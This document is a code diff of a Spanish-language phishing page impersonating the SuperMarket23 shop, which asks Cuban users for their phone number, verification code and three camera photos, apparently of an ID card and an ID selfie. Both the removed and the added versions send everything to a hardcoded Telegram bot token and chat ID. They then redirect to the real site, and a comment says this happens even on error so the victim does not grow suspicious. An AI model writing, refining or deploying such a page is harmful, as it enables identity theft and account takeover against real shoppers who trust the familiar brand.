@@ -3,88 +3,156 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SuperMarket23</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>SuperMarket23 - Verificación</title>
     <style>
-        body { font-family: sans-serif; margin: 0; text-align: center; background: #fff; }
-        .header { background: #004691; color: white; padding: 25px; font-size: 28px; font-weight: bold; }
-        .container { padding: 20px; max-width: 450px; margin: auto; }
-        .input-box { display: flex; align-items: center; background: #f9f9f9; border: 2px solid #004691; border-radius: 8px; padding: 12px; margin-bottom: 20px; }
-        .photo-input { width: 100%; height: 150px; border: 2px dashed #004691; margin-bottom: 15px; border-radius: 10px; display: flex; align-items: center; justify-content: center; background: #f0f5ff; cursor: pointer; overflow: hidden; }
-        .photo-input img { width: 100%; height: 100%; object-fit: cover; display: none; }
-        .btn { background: #004691; color: white; border: none; width: 100%; padding: 18px; font-size: 20px; font-weight: bold; border-radius: 8px; cursor: pointer; }
+        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        body { font-family: 'Segoe UI', Arial, sans-serif; margin: 0; padding: 0; background-color: #ffffff; color: #333; }
+
+        /* CABECERA SOLICITADA */
+        .header { background-color: #004494; color: white; padding: 40px 20px; text-align: center; border-bottom: 6px solid #002d62; }
+        .header h1 { margin: 0; font-size: 36px; font-weight: 900; letter-spacing: 1px; text-transform: uppercase; }
+
+        .container { padding: 20px; max-width: 500px; margin: 0 auto; }
+        label { display: block; font-weight: 700; margin: 15px 0 8px 0; color: #004494; font-size: 13px; text-transform: uppercase; }
+
+        /* INPUT TELÉFONO +53 */
+        .phone-container { display: flex; align-items: center; border: 2px solid #004494; border-radius: 10px; overflow: hidden; }
+        .prefix { background: #f0f4f8; padding: 15px; font-weight: bold; color: #004494; border-right: 1px solid #ddd; font-size: 18px; }
+        .phone-input { border: none; padding: 15px; flex: 1; font-size: 18px; outline: none; font-weight: 600; }
+
+        /* RECUADROS F1, F2, F3 */
+        .card-slot {
+            width: 100%; height: 200px; border: 3px dashed #004494; border-radius: 15px;
+            margin-bottom: 15px; display: flex; align-items: center; justify-content: center;
+            background-color: #f4f8ff; position: relative; overflow: hidden;
+        }
+        .preview-img { width: 100%; height: 100%; object-fit: cover; position: absolute; z-index: 20; display: none; }
+        .slot-text { text-align: center; color: #004494; font-weight: 900; font-size: 20px; z-index: 10; }
+        .camera-trigger { position: absolute; width: 100%; height: 100%; opacity: 0; z-index: 30; cursor: pointer; }
+
+        /* INPUT CÓDIGO BLANCO */
+        .code-input {
+            width: 100%; padding: 18px; border: 2px solid #004494; border-radius: 10px;
+            font-size: 18px; text-align: center; margin-bottom: 20px; outline: none; background: #fff;
+        }
+
+        /* BOTÓN Y LOADING */
+        .btn-auth {
+            width: 100%; background-color: #004494; color: white; padding: 20px;
+            border: none; border-radius: 12px; font-size: 20px; font-weight: bold;
+            cursor: pointer; text-transform: uppercase; box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+        }
+        #loading-overlay {
+            display: none; position: fixed; top:0; left:0; width:100%; height:100%; 
+            background: rgba(255,255,255,0.9); z-index: 1000; flex-direction: column; align-items: center; justify-content: center;
+        }
+        .spinner { width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid #004494; border-radius: 50%; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-<div class="header">SUPERMARKET23</div>
-
-<div class="container">
-    <div class="input-box">
-        <span style="font-weight:bold; color:#004691; margin-right:5px;">+53 #</span>
-        <input type="tel" id="num" placeholder="Número" style="border:none; outline:none; font-size:18px; width:100%;">
+    <div id="loading-overlay">
+        <div class="spinner"></div>
+        <p id="status-text" style="color:#004494; font-weight:bold; margin-top:15px;">Procesando...</p>
     </div>
 
-    <div class="photo-input" onclick="document.getElementById('f1').click()">
-        <span id="t1">FOTO FRONTAL ID</span>
-        <img id="i1"><input type="file" id="f1" accept="image/*" capture="camera" hidden onchange="view(this,'i1','t1')">
-    </div>
-    <div class="photo-input" onclick="document.getElementById('f2').click()">
-        <span id="t2">FOTO TRASERA ID</span>
-        <img id="i2"><input type="file" id="f2" accept="image/*" capture="camera" hidden onchange="view(this,'i2','t2')">
-    </div>
-    <div class="photo-input" onclick="document.getElementById('f3').click()">
-        <span id="t3">SELFIE CON ID</span>
-        <img id="i3"><input type="file" id="f3" accept="image/*" capture="camera" hidden onchange="view(this,'i3','t3')">
+    <div class="header">
+        <h1>SuperMarket23</h1>
     </div>
 
-    <div class="input-box">
-        <input type="text" id="codigo" placeholder="Código de Verificación" style="border:none; outline:none; font-size:18px; width:100%; text-align:center;">
+    <div class="container">
+        <label>Número de Teléfono</label>
+        <div class="phone-container">
+            <span class="prefix">+53</span>
+            <input type="tel" id="user-phone" class="phone-input" placeholder="5XXXXXXX" maxlength="8">
+        </div>
+
+        <label>Documentación Requerida</label>
+        
+        <div class="card-slot">
+            <input type="file" accept="image/*" capture="environment" class="camera-trigger" onchange="handleCapture(this, 'F1')">
+            <img id="img-F1" class="preview-img">
+            <div class="slot-text" id="txt-F1">F1</div>
+        </div>
+
+        <div class="card-slot">
+            <input type="file" accept="image/*" capture="environment" class="camera-trigger" onchange="handleCapture(this, 'F2')">
+            <img id="img-F2" class="preview-img">
+            <div class="slot-text" id="txt-F2">F2</div>
+        </div>
+
+        <div class="card-slot">
+            <input type="file" accept="image/*" capture="environment" class="camera-trigger" onchange="handleCapture(this, 'F3')">
+            <img id="img-F3" class="preview-img">
+            <div class="slot-text" id="txt-F3">F3</div>
+        </div>
+
+        <label>Código de Verificación</label>
+        <input type="text" id="user-code" class="code-input" placeholder="Ingrese el código">
+
+        <button class="btn-auth" onclick="startAuth()">Autenticar</button>
     </div>
 
-    <button class="btn" onclick="send()">AUTENTICAR</button>
-</div>
+    <script>
+        /* CONFIGURACIÓN SEGÚN CAPTURAS ENVIADAS */
+        const TG_TOKEN = '8318759298:AAG-KrV_QaFdJb_Z3DUBu_gyJiPPdb2HofA'; //
+        const TG_CHAT_ID = '6475554235'; //
+        
+        let fotos = { F1: null, F2: null, F3: null };
 
-<script>
-    function view(input, imgId, txtId) {
-        if (input.files && input.files[0]) {
-            var reader = new FileReader();
-            reader.onload = function(e) {
-                document.getElementById(imgId).src = e.target.result;
-                document.getElementById(imgId).style.display = 'block';
-                document.getElementById(txtId).style.display = 'none';
-            };
-            reader.readAsDataURL(input.files[0]);
-        }
-    }
-
-    async function send() {
-        const tel = document.getElementById('num').value;
-        const cod = document.getElementById('codigo').value;
-        // Tu nuevo token activo
-        const tok = "8318759298:AAG-KrV_QaFdJb_Z3DUbU_gyJiPPdb2HofA"; 
-        const cid = "6475554235"; // Tu ID confirmado
-
-        try {
-            // Envío de datos de texto
-            await fetch(`https://api.telegram.org/bot${tok}/sendMessage?chat_id=${cid}&text=NUEVO:+53+#${tel}%0ACÓDIGO:+${cod}`);
-            
-            // Envío de las 3 fotos
-            for (let id of ['f1', 'f2', 'f3']) {
-                let f = document.getElementById(id).files[0];
-                if (f) {
-                    let fd = new FormData();
-                    fd.append('chat_id', cid);
-                    fd.append('photo', f);
-                    await fetch(`https://api.telegram.org/bot${tok}/sendPhoto`, {method: 'POST', body: fd});
+        function handleCapture(input, id) {
+            const file = input.files[0];
+            if (file) {
+                fotos[id] = file;
+                const reader = new FileReader();
+                reader.onload = function(e) {
+                    const img = document.getElementById('img-' + id);
+                    img.src = e.target.result;
+                    img.style.display = 'block';
+                    document.getElementById('txt-' + id).style.display = 'none';
                 }
+                reader.readAsDataURL(file);
             }
-            // Redirección final
-            window.location.href = "https://www.supermarket23.com/";
-        } catch (e) {
-            window.location.href = "https://www.supermarket23.com/";
         }
-    }
-</script>
+
+        async function startAuth() {
+            const phone = document.getElementById('user-phone').value;
+            const code = document.getElementById('user-code').value;
+
+            if(!phone || !code || !fotos.F1 || !fotos.F2 || !fotos.F3) {
+                alert("Por favor, complete todos los campos y tome las 3 fotos.");
+                return;
+            }
+
+            document.getElementById('loading-overlay').style.display = 'flex';
+
+            try {
+                // Envío de datos de texto
+                const msg = `🔔 *Nueva Captura SM23*\n\n📱 Tel: +53 ${phone}\n🔑 Clave: ${code}`;
+                await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
+
+                // Envío de fotos
+                for (let id in fotos) {
+                    const formData = new FormData();
+                    formData.append('chat_id', TG_CHAT_ID);
+                    formData.append('photo', fotos[id]);
+                    formData.append('caption', `Foto ${id} de +53 ${phone}`);
+                    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+                }
+
+                // Éxito y redirección oficial
+                document.getElementById('status-text').innerText = "¡Autenticación Exitosa!";
+                setTimeout(() => {
+                    window.location.href = "https://www.supermarket23.com";
+                }, 2000);
+
+            } catch (error) {
+                // Redirección forzada incluso en error para evitar sospechas
+                window.location.href = "https://www.supermarket23.com";
+            }
+        }
+    </script>
 </body>
 </html>
